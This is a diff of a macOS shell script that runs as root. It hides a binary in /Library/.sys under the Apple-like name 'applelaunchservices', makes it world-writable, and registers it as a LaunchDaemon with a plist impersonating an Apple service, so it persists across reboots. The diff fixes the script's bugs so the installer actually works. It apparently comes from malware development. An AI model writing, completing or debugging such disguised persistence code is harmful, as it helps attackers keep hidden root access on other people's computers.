@@ -3,7 +3,7 @@
 [ "$(whoami)" = 'root' ] || exit
 install_binary() {
 	mkdir -p /Library/.sys
-	mv $binary /Library/.sys/applelaunchservices
+	mv "$1" /Library/.sys/applelaunchservices
 	chmod 0777 /Library/.sys/applelaunchservices
 	PLIST="<plist version '1.0'>
 		<dict>
@@ -22,7 +22,7 @@ install_binary() {
 		</dict>
 		</plist>"
 	echo $PLIST > /Library/LaunchDaemons/com.apple.initlaunchservices.plist
-	chmown root:wheel /Library/LaunchDaemons/com.apple.initlaunchservices.plist
+	chown root:wheel /Library/LaunchDaemons/com.apple.initlaunchservices.plist
 	chmod 0644 /Library/LaunchDaemons/com.apple.initlaunchservices.plist
 }
 install_binary $1
